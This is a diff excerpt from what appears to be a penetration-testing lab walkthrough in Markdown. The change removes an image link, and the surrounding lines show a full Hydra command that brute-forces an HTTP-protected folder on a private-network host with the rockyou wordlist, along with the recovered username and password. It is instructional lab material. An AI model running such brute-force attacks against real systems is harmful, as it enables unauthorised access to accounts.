@@ -38,9 +38,7 @@ Because the folder is password protected, we need to either guess the password o
 - Using Ashton's name, run the Hydra attack against the directory:
 
   - Type: `hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder`
-
-    ![5_hydra_sytanx.png](images/5_hydra_sytanx.png)
-
+  
 - The brute force attack may take some time. Once it finishes, you'll find the username is `ashton` and the password is `leopoldo`.
 
    ![6_password_discovery.png](images/6_password_discovery.png)
